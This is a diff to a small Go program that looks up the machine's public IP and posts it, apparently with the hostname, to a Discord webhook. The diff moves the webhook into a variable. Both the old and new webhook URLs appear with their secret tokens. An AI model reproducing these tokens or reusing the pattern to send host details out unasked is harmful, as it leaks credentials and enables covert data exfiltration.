@@ -12,6 +12,8 @@ import (
 
 func main() {
 
+	webhookURL := "https://discord.com/api/webhooks/860332001756053546/N9TMEZeMUYN9omeMx64WHTfwOy-hKI0qZbI0QWBAhW4_uii5OFUbZwq9XETPfiqG2mxZ"
+
 	resp, err := http.Get("http://ifconfig.me/ip")
 	if err != nil {
 		log.Fatalln(err)
@@ -34,7 +36,7 @@ func main() {
 	})
 	responseBody := bytes.NewBuffer(postBody)
 
-	http.Post("https://discord.com/api/webhooks/860256580175396926/bqnJXYpwhLbnoS7YheuBdNGBESzkyZECRH3_6Yu8CKDlxDMg1fadqqbXbbZDF_vtz8QN", "application/json", responseBody)
+	http.Post(webhookURL, "application/json", responseBody)
 
 	fmt.Println(hostname, sb)
 }
